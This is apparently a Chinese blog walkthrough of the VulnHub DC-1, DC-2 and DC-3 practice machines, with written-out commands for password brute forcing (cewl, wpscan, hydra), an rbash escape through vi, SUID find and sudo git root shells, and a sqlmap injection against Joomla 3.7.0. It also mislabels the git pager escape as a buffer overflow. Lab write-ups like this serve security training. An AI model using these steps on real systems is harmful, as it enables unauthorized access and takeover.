<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830211739164.png"><img src="/vulnhub/image-20220830211739164.png" alt="image-20220830211739164"></a></p>
<p>这里就看到<code>flag4</code>用户的密码被爆破出来，是<code>orange</code></p>
<p>然后用<code>ssh</code>连接</p>
<blockquote>
<p>输入<code>ssh flag4@192.168.133.136</code><br>然后yes<br>然后输入密码：<code>orange</code></p>
</blockquote>
<p>进入<code>flag4</code>用户页面，</p>
<blockquote>
<p>输入<code>cat flag4.txt</code><br>得到flag4</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830211817515.png"><img src="/vulnhub/image-20220830211817515.png" alt="image-20220830211817515"></a></p>
<hr>
<h2 id="Flag5"><a href="#Flag5" class="headerlink" title="Flag5"></a>Flag5</h2><blockquote>
<p>分析一下flag5<br><code>Can you use this same method to find or access the flag in root?</code></p>
<p><code>Probably. But perhaps it&#39;s not that easy.  Or maybe it is?</code></p>
<p>意思是：您可以使用相同的方法查找或访问根目录中的标志吗？</p>
<p>可能但也许这并不容易。也许是这样？</p>
</blockquote>
<p><code>root</code>应该就是需要提权了</p>
<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p><code>linux</code>提权操作可以看一下我的<code>WEB随笔</code>里<code>suid</code>提权，下面只记录流程</p>
<blockquote>
<p>输入<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，查看目录下suid权限所有可执行二进制文件</p>
</blockquote>
<p>发现<code>find</code>目录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830162407934.png"><img src="/vulnhub/image-20220830162407934.png" alt="image-20220830162407934"></a></p>
<p>于是可以利用<code>find</code>获取<code>root</code>权限<code>shell</code></p>
<p>主要是要让<code>find</code>命令成功执行，找一个存在的文件即可</p>
<blockquote>
<p>以在根目录为例<br>输入<code>find / -name initrd.img -exec &quot;/bin/sh&quot; \;</code></p>
</blockquote>
<p>提权成功</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830164525214.png"><img src="/vulnhub/image-20220830164525214.png" alt="image-20220830164525214"></a></p>
<p>我们在<code>flag4</code>里知道，最后的旗子在<code>root</code>目录里</p>
<blockquote>
<p>输入<code>cd /root;ls -a</code></p>
</blockquote>
<p>发现<code>thefinalflag.txt</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220830164848589.png"><img src="/vulnhub/image-20220830164848589.png" alt="image-20220830164848589"></a></p>
<blockquote>
<p><code>Well done!!!!</code></p>
<p><code>Hopefully you&#39;ve enjoyed this and learned some new skills.</code></p>
<p><code>You can let me know what you thought of this little journey</code><br><code>by contacting me via Twitter - @DCAU7</code><br>意思是：<br>做得好！！！！</p>
<p>希望你喜欢这一点，并学习了一些新技能。</p>
<p>你可以告诉我你对这次小旅行的看法<br>通过Twitter联系我-@DCAU7 </p>
</blockquote>
<p><strong>5个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="二、DC-2-初级"><a href="#二、DC-2-初级" class="headerlink" title="二、DC-2[初级]"></a>二、DC-2[初级]</h1><p><strong>five flags</strong></p>
<h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p> 先用<code>nmap</code>扫描一些</p>
<blockquote>
<p>输入<code>nmap -p- 192.168.133.138</code></p>
</blockquote>
<p>发现内容太少了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831205238565.png"><img src="/vulnhub/image-20220831205238565.png" alt="image-20220831205238565"></a></p>
<blockquote>
<p>输入<code>nmap -p- 192.168.133.138 -A</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831205550715.png"><img src="/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></a></p>
<p>发现<code>7744</code>端口运行的<code>ssh</code>，<code>22</code>端口被换了</p>
<blockquote>
<p>Ssh是一个安全的远程登录协议,它的端口号默认是22端口</p>
</blockquote>
<blockquote>
<p>SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH。</p>
</blockquote>
<p>我们试试访问我们的靶机<code>ip</code>：<code>192.168.133.138</code></p>
<hr>
<p>但是访问失败【如果没有问题，可以忽略】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831210742250.png"><img src="/vulnhub/image-20220831210742250.png" alt="image-20220831210742250"></a></p>
<p>可以看到，访问<code>IP</code>的时候进行了一个跳转，跳转到了<code>http://dc-2</code>，且无法访问</p>
<p>我猜测是<code>hosts</code>文件没有修改，所以域名无法登录</p>
<p>需要在<code>hosts</code>其中添加域名：<code>http://dc-2</code>和其ip：<code>192.168.133.138</code>，<code>dns</code>才能正常转换</p>
<blockquote>
<p>输入<code>vi /etc/hosts</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831211542540.png"><img src="/vulnhub/image-20220831211542540.png" alt="image-20220831211542540"></a></p>
<p>向其中添加</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.133.138</span> dc-<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831212553718.png"><img src="/vulnhub/image-20220831212553718.png" alt="image-20220831212553718"></a></p>
<p>刷新浏览器，再次访问<code>192.168.133.138</code>或<code>http://dc-2</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831212746196.png"><img src="/vulnhub/image-20220831212746196.png" alt="image-20220831212746196"></a></p>
<p>成功连接</p>
<hr>
<h2 id="Flag1-1"><a href="#Flag1-1" class="headerlink" title="Flag1"></a>Flag1</h2><p>进入网页就看到<code>flag</code>了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831212936534.png"><img src="/vulnhub/image-20220831212936534.png" alt="image-20220831212936534"></a></p>
<p>点击打开查看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831213114724.png"><img src="/vulnhub/image-20220831213114724.png" alt="image-20220831213114724"></a></p>
<blockquote>
<p><code>Flag 1:</code></p>
<p><code>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</code></p>
<p><code>More passwords is always better, but sometimes you just can’t win them all.</code></p>
<p><code>Log in as one to see the next flag.</code></p>
<p><code>If you can’t find it, log in as another.</code></p>
<p>意思是：<br>你通常的密码表可能不起作用，因此，也许你只需要成为cewl。</p>
<p>密码越多越好，但有时你无法赢得所有密码。</p>
<p>作为一个登录以查看下一个标志。</p>
<p>如果找不到，请作为另一个登录</p>
<p>·Cewl是一个通过指定url及深度,使用爬虫技术,生成字典的一个工具。</p>
<p>那我们就用cewl工具试一下<br>*不会工具一般用-h就可以知道使用说明</p>
</blockquote>
<hr>
<h2 id="Flag2-1"><a href="#Flag2-1" class="headerlink" title="Flag2"></a>Flag2</h2><p>根据<code>flag1</code>，我们用<code>cewl</code>试试生成字典</p>
<h3 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h3><blockquote>
<p>输入<code>cewl http://dc-2/ &gt;pass.txt</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831221031390.png"><img src="/vulnhub/image-20220831221031390.png" alt="image-20220831221031390"></a></p>
<p>目录下就会生成<code>pass.txt</code></p>
<blockquote>
<p>输入<code>cat pass.txt</code>，查看内容</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831221151099.png"><img src="/vulnhub/image-20220831221151099.png" alt="image-20220831221151099"></a></p>
<p>发现是生成对应网站的密码字典</p>
<p><code>flag1</code>整理信息好像差不多了，下面我们利用<code>dc1</code>提到的<code>wappalyzer</code>，查看一下网页的框架结构有没有什么线索</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831221945690.png"><img src="/vulnhub/image-20220831221945690.png" alt="image-20220831221945690"></a></p>
<p>发现网站的<code>CMS</code>是<code>WordPress</code>，还可以看到它的主题是<code>Twenty Seventeen</code></p>
<p>那<code>wordpress</code>，有没有什么漏洞可以供我们利用呢，下面就提及另一个工具</p>
<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><blockquote>
<p><code>WPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写 能够扫描WordPress网站中的多种安全漏洞,其中包括主题漏洞、插件漏洞和WordPress本身的漏洞</code></p>
</blockquote>
<p>于是我们就可以针对性对wordpress进行渗透看看，可不可以利用一下</p>
<blockquote>
<p>输入<code>wpscan --url http://dc-2 -e u</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831223359965.png"><img src="/vulnhub/image-20220831223359965.png" alt="image-20220831223359965"></a></p>
<p>然后往下看用户名</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831223432802.png"><img src="/vulnhub/image-20220831223432802.png" alt="image-20220831223432802"></a></p>
<p>发现有三个，然后可以复制下来，弄一个用户名的文本，和之前的<code>pass.txt</code>这个密码本一样</p>
<blockquote>
<p>输入<code>vi un.txt</code></p>
<p>把<code>admin</code> <code>jerry</code> <code>tom</code>复制进去</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831223714569.png"><img src="/vulnhub/image-20220831223714569.png" alt="image-20220831223714569"></a></p>
<p>然后就可以结合我们的密码文本和用户名文本，利用<code>wpscan</code>这个工具，进行爆破操作了</p>
<blockquote>
<p>输入<code>wpscan --url http://dc-2 -P pass.txt -U un.txt</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831223950721.png"><img src="/vulnhub/image-20220831223950721.png" alt="image-20220831223950721"></a></p>
<p>稍微等一会</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831224205560.png"><img src="/vulnhub/image-20220831224205560.png" alt="image-20220831224205560"></a></p>
<p><code>admin</code>用户密码没有找到，应该是最高权限的账号</p>
<p>但是<code>jerry</code>和<code>tom</code>用户的密码已经知道了</p>
<p>下面，我们就要开始找登录的页面了，一般是后台网站</p>
<p>我们可以用<code>dirsearch</code>工具进行扫描看看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831224818079.png"><img src="/vulnhub/image-20220831224818079.png" alt="image-20220831224818079"></a></p>
<p>发现网站</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831224833915.png"><img src="/vulnhub/image-20220831224833915.png" alt="image-20220831224833915"></a></p>
<p>用我们之前获得的用户名和密码登录试试</p>
<p>以<code>jerry</code>为例，好像用<code>tom</code>会显示密码错误</p>
<p>在<code>page</code>窗口发现<code>flag2</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831225233262.png"><img src="/vulnhub/image-20220831225233262.png" alt="image-20220831225233262"></a></p>
<p>点开查看，得到flag2</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831225256842.png"><img src="/vulnhub/image-20220831225256842.png" alt="image-20220831225256842"></a></p>
<blockquote>
<p><code>Flag 2:</code></p>
<p><code>If you can&#39;t exploit WordPress and take a shortcut, there is another way.</code></p>
<p><code>Hope you found another entry point.</code><br>意思是：<br>如果你不能利用WordPress并走捷径，还有另一种方法。</p>
<p>希望你能找到另一个切入点。 </p>
</blockquote>
<hr>
<h2 id="Flag3-1"><a href="#Flag3-1" class="headerlink" title="Flag3"></a>Flag3</h2><p>根据<code>flag2</code>的提示，实际上就是说从<code>wordpress</code>这条路是行不通的，要从另外的方向</p>
<p>但是如果<code>wordpress</code>行不通，而这个网站就是<code>wordpress</code>搭建起来的，那么这个网站的就不能下手</p>
<p>虽然网站的<code>80</code>端口的<code>http</code>行不通</p>
<p>但是我们之前用<code>nmap</code>扫了一下，发现端口<code>7744</code>运行着<code>ssh</code>，那我们能不能利用<code>ssh</code>登录成功呢</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831205550715.png"><img src="/vulnhub/image-20220831205550715.png" alt="image-20220831205550715"></a></p>
<p>我们先用之前用过的工具<code>hydra</code>进行爆破一下，看看这个<code>ssh</code>的用户是谁</p>
<blockquote>
<p>输入<code>hydra -l un.txt -P pass.txt 192.168.133.138 ssh -s 7744</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831230552544.png"><img src="/vulnhub/image-20220831230552544.png" alt="image-20220831230552544"></a></p>
<p>发现<code>tom</code>账号是在这里登录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831231405322.png"><img src="/vulnhub/image-20220831231405322.png" alt="image-20220831231405322"></a></p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入ssh <span class="symbol">tom@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.138</span> -p <span class="number">7744</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831231449571.png"><img src="/vulnhub/image-20220831231449571.png" alt="image-20220831231449571"></a></p>
<p>登录成功后，<code>ls</code>发现<code>flag3.txt</code></p>
<blockquote>
<p>输入<code>cat flag3.txt</code>，查看内容</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831231634426.png"><img src="/vulnhub/image-20220831231634426.png" alt="image-20220831231634426"></a></p>
<p>发现没有该命令，那就可能是没有权限执行这个命令了</p>
<h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>看到<code>rbash</code>，不认识，查一下</p>
<blockquote>
<p><code>rbash</code><br>它与一般shell的区别在于会限制一些行为，让一些命令无法执行</p>
</blockquote>
<p>看来是限制了我们的命令，但我们还是得知道我们目前还能用那些命令，之前使用过<code>ls</code>，所以<code>ls</code>可以使用</p>
<blockquote>
<p>输入<code>ls /home/tom/usr/bin</code>   </p>
<p>&#x2F;&#x2F;查看rbash设置的可执行的命令</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831232504736.png"><img src="/vulnhub/image-20220831232504736.png" alt="image-20220831232504736"></a></p>
<p>我们可以看到我们可以利用</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">less <span class="keyword">ls</span> scp <span class="keyword">vi</span></span><br></pre></td></tr></table></figure>

<p>关键是<code>vi</code>的命令</p>
<h3 id="vi绕过-rbash逃逸"><a href="#vi绕过-rbash逃逸" class="headerlink" title="*vi绕过-&gt;rbash逃逸"></a>*vi绕过-&gt;rbash逃逸</h3><p>可以进入<code>vi</code>中，执行<code>set</code>命令，把<code>shell</code>改为<code>/bin/sh</code></p>
<blockquote>
<p> 先输入<code>vi</code>，进入<code>vi</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831233127692.png"><img src="/vulnhub/image-20220831233127692.png" alt="image-20220831233127692"></a></p>
<p>然后</p>
<blockquote>
<p>直接输入，<strong>不用按i</strong><br><code>:set shell=/bin/sh</code>    &#x2F;&#x2F;给shell赋值<br>回车<br><code>:shell</code>                &#x2F;&#x2F;执行shell<br>回车，就退回主界面来了</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831233626801.png"><img src="/vulnhub/image-20220831233626801.png" alt="image-20220831233626801"></a></p>
<p>这样我们就完成了逃逸</p>
<p>之前因为我们受限于<code>rbash</code>，不能执行<code>cd</code>等命令</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831233814113.png"><img src="/vulnhub/image-20220831233814113.png" alt="image-20220831233814113"></a></p>
<p>现在执行试试</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831234028674.png"><img src="/vulnhub/image-20220831234028674.png" alt="image-20220831234028674"></a></p>
<p>就没有阻止了</p>
<p>我们再试试<code>cat</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831234235801.png"><img src="/vulnhub/image-20220831234235801.png" alt="image-20220831234235801"></a></p>
<p>发现<code>cat</code>命令找不到，但是我们已经绕过了<code>rbash</code>，所以只能是其他原因，最有可能就是<code>cat</code>的环境没有设置到当前位置</p>
<blockquote>
<p>输入<code>echo $PATH</code><br>这是显示当前环境变量，可能cat并没有被设置到当前的环境变量所以无法执行</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831234423827.png"><img src="/vulnhub/image-20220831234423827.png" alt="image-20220831234423827"></a></p>
<h3 id="设置全局变量"><a href="#设置全局变量" class="headerlink" title="*设置全局变量"></a>*设置全局变量</h3><blockquote>
<p>于是我们来设置全局变量,终端输入<br><code>export PATH=PATH:/usr/local/sbin:/usr/local/bin:usr/sbin:/usr/bin:/bin:sbin</code></p>
</blockquote>
<p>这样我们执行<code>cat</code>就不会只在<code>/home/tom/usr/bin</code>里面寻找了，会在很多目录里寻找</p>
<blockquote>
<p>输入</p>
<p><code>cd tom</code><br><code>ls</code><br><code>cat flag3.txt</code><br>得到flag3</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220831235038373.png"><img src="/vulnhub/image-20220831235038373.png" alt="image-20220831235038373"></a></p>
<blockquote>
<p><code>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</code><br>意思是：</p>
<p>可怜的老汤姆总是在追杰瑞。也许他应该为他造成的所有压力负责。</p>
<p>但是看到了su，也就是需要切换用户</p>
</blockquote>
<hr>
<h2 id="Flag4-1"><a href="#Flag4-1" class="headerlink" title="Flag4"></a>Flag4</h2><p>根据<code>flag3</code>，我们可以知道需要用<code>su</code>命令切换用户到<code>jerry</code></p>
<blockquote>
<p>输入<code>su jerry</code>和其密码<code>adipiscing</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901094337288.png"><img src="/vulnhub/image-20220901094337288.png" alt="image-20220901094337288"></a></p>
<p>然后切换到<code>jerry</code>目录，发现<code>flag4.txt</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901094512382.png"><img src="/vulnhub/image-20220901094512382.png" alt="image-20220901094512382"></a></p>
<blockquote>
<p><code>Good to see that you&#39;ve made it this far - but you&#39;re not home yet.</code> </p>
<p><code>You still need to get the final flag (the only flag that really counts!!!).</code>  </p>
<p><code>No hints here - you&#39;re on your own now.  :-)</code></p>
<p><code>Go on - git outta here!!!!</code><br>意思是：<br>很高兴看到你走了这么远，但你还没回家。<br>你仍然需要得到最后的标志（唯一真正重要的标志！！！）。<br>这里没有提示-你现在只能靠自己了。：-）</p>
<p>去吧-滚出去！！！！</p>
<p>看到git，就是提示我们用git命令</p>
</blockquote>
<hr>
<h2 id="Flag5-1"><a href="#Flag5-1" class="headerlink" title="Flag5"></a>Flag5</h2><h3 id="git缓存区溢出漏洞"><a href="#git缓存区溢出漏洞" class="headerlink" title="*git缓存区溢出漏洞"></a>*git缓存区溢出漏洞</h3><blockquote>
<p>输入<code>sudo -l</code><br>&#x2F;&#x2F;列出目前用户可执行与无法执行的指令。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901112624228.png"><img src="/vulnhub/image-20220901112624228.png" alt="image-20220901112624228"></a></p>
<p><u>就可以发现root以<code>nopasswd</code>【不需要密码】运行<code>git</code>命令</u></p>
<p>原理是<code>git</code>存在缓存区溢出漏洞，</p>
<p>在使用</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>不需要输入<code>root</code>密码，即可以<code>root</code>身份执行这条命令</p>
<p>操作如下</p>
<blockquote>
<p><code>sudo git -p</code>    </p>
<p>&#x2F;&#x2F;-p是分页查看，这个原理就是终端的窗口大小不够显示，所以下方会出现冒号，等待输入命令</p>
</blockquote>
<p>下面可以看看区别</p>
<h4 id="注意窗口大小"><a href="#注意窗口大小" class="headerlink" title="*注意窗口大小"></a>*注意窗口大小</h4><h5 id="1-窗口足够大"><a href="#1-窗口足够大" class="headerlink" title="1.窗口足够大"></a>1.窗口足够大</h5><p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901113721300.png"><img src="/vulnhub/image-20220901113721300.png" alt="image-20220901113721300"></a></p>
<p>可以看到显示完了，就又回到原处了【不行】</p>
<h5 id="2-窗口小一些"><a href="#2-窗口小一些" class="headerlink" title="2.窗口小一些"></a>2.窗口小一些</h5><p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901113851826.png"><img src="/vulnhub/image-20220901113851826.png" alt="image-20220901113851826"></a></p>
<p>下方就显示出:，等待输入</p>
<blockquote>
<p>冒号<code>:</code>是自带有的，不是输入的<br><code>:!/bin/sh</code></p>
<p>&#x2F;&#x2F;感叹号!是shell转义字符，所以要避免sudo授权用户使用<code>vi，vim，ftp，lee，more，git</code><br><code>进入root</code></p>
<p><code>cd /root</code></p>
<p>当然也可以执行<code>:!passwd root</code><br>修改其密码<br>然后<code>su root</code>登录也可</p>
</blockquote>
<h3 id="法-1-执行命令，拿到root的shell"><a href="#法-1-执行命令，拿到root的shell" class="headerlink" title="法 1.执行命令，拿到root的shell"></a>法 1.执行命令，拿到root的shell</h3><p><code>$</code>变成<code>#</code>成功</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901114902493.png"><img src="/vulnhub/image-20220901114902493.png" alt="image-20220901114902493"></a></p>
<h3 id="法-2-修改密码，登录"><a href="#法-2-修改密码，登录" class="headerlink" title="法 2.修改密码，登录"></a>法 2.修改密码，登录</h3><p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901114453769.png"><img src="/vulnhub/image-20220901114453769.png" alt="image-20220901114453769"></a></p>
<p><code>$</code>变成<code>#</code>，成功登录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901114726423.png"><img src="/vulnhub/image-20220901114726423.png" alt="image-20220901114726423"></a></p>
<p>然后到<code>/root</code>目录下，找到最后的 <code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220901115306177.png"><img src="/vulnhub/image-20220901115306177.png" alt="image-20220901115306177"></a></p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___|<span class="string"> </span>|<span class="string"> </span>|<span class="string">   __</span>|<span class="string"> </span>|<span class="string"> ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ </span>|<span class="string"> </span>|<span class="string">  / _` </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___\/   </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Congratulatons!!!</code></p>
<p><code>A special thanks to all those who sent me tweets</code><br><code>and provided me with feedback - it&#39;s all greatly</code><br><code>appreciated.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code><br>意思是：</p>
<p>恭喜！！！</p>
<p>特别感谢所有给我发推文的人</p>
<p>并向我提供了反馈-非常棒<br>谢谢。</p>
<p>如果您喜欢这个CTF，请通过@DCAU7给我发一条推文</p>
</blockquote>
<p><strong>5个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="三、DC-3-初级"><a href="#三、DC-3-初级" class="headerlink" title="三、DC-3[初级]"></a>三、DC-3[初级]</h1><p><strong>only one flag</strong></p>
<h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>【前面的靶机<code>ip</code>寻找，按之前的步骤即可】</p>
<p>先用<code>nmap</code>扫一下我们的靶机<code>ip</code></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.133.139</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902123406584.png"><img src="/vulnhub/image-20220902123406584.png" alt="image-20220902123406584"></a></p>
<p>看到只有<code>80</code>端口，运行着一个<code>http</code>服务，中间件为<code>apache2.4.18</code></p>
<p>内容管理系统（<code>CMS</code>）是<code>joomla</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902123056590.png"><img src="/vulnhub/image-20220902123056590.png" alt="image-20220902123056590"></a></p>
<p>利用插件<code>wappalyzer</code>，也可以看到其<code>CMS</code>为<code>joomla</code></p>
<p>我们可以利用<code>kali</code>包当中自带的<code>joomscan</code>工具对其进行扫描</p>
<blockquote>
<p>漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。还能够以HTML或文本格式导出扫描报告。</p>
</blockquote>
<p>【没有的，可能需要更新包，然后直接下载即可】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902185529785.png"><img src="/vulnhub/image-20220902185529785.png" alt="image-20220902185529785"></a></p>
<blockquote>
<p>输入<code>joomscan -u 192.168.133.139</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902185954570.png"><img src="/vulnhub/image-20220902185954570.png" alt="image-20220902185954570"></a></p>
<p>扫描发现了，管理员的登录网址<code>http://192.168.133.139/administrator/</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902190312468.png"><img src="/vulnhub/image-20220902190312468.png" alt="image-20220902190312468"></a></p>
<p>但是不知道用户名和密码</p>
<hr>
<p>发现其<code>joomla</code>版本为<code>3.7.0</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902194849302.png"><img src="/vulnhub/image-20220902194849302.png" alt="image-20220902194849302"></a></p>
<p>但我们并不知道该版本有哪些漏洞，所以需要用到 <code>kali</code>的<code>Exploit-DB</code>工具</p>
<p>可以在浏览器里的<code>Exploit-DB</code>网址进行查询【不过因为是国外网址有点卡】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220902195723987.png"><img src="/vulnhub/image-20220902195723987.png" alt="image-20220902195723987"></a></p>
<p>然后寻找下载payload</p>
<hr>
<p>也可以在终端输入命令查询【也是基于<code>Exploit-DB</code>的命令行搜索工具,可以帮助我们查找渗透模块】</p>
<blockquote>
<p>输入<code>searchsploit joomla 3.7.0</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903084826356.png"><img src="/vulnhub/image-20220903084826356.png" alt="image-20220903084826356"></a></p>
<p>可以看到<code>joomla 3.7.0</code>版本存在<code>sql注入</code>的漏洞</p>
<p> 然后查看<code>Path</code></p>
<blockquote>
<p>输入<code>searchsploit -p 42033</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903124805721.png"><img src="/vulnhub/image-20220903124805721.png" alt="image-20220903124805721"></a></p>
<p><code>Path</code>就是该漏洞利用方法的文本地址</p>
<blockquote>
<p>输入<code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903125053542.png"><img src="/vulnhub/image-20220903125053542.png" alt="image-20220903125053542"></a></p>
<p>可以看到该漏洞的测试平台，时间，还有漏洞的<code>CVE</code>编号</p>
<p>关键在它给出的<code>sqlmap</code>注入的模板</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p>
<p>&#x2F;&#x2F;把localhost改成靶机ip即可</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903125630036.png"><img src="/vulnhub/image-20220903125630036.png" alt="image-20220903125630036"></a></p>
<p>运行</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903125921853.png"><img src="/vulnhub/image-20220903125921853.png" alt="image-20220903125921853"></a></p>
<p>发现了靶机下的数据库，我们所需要的就是<code>joomladb</code></p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables</code></p>
<p>&#x2F;&#x2F;在原有的payload后加上-D joomladb，选定数据库<br>&#x2F;&#x2F;再在后面加上–tables，输出该数据库的表</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903130545749.png"><img src="/vulnhub/image-20220903130545749.png" alt="image-20220903130545749"></a></p>
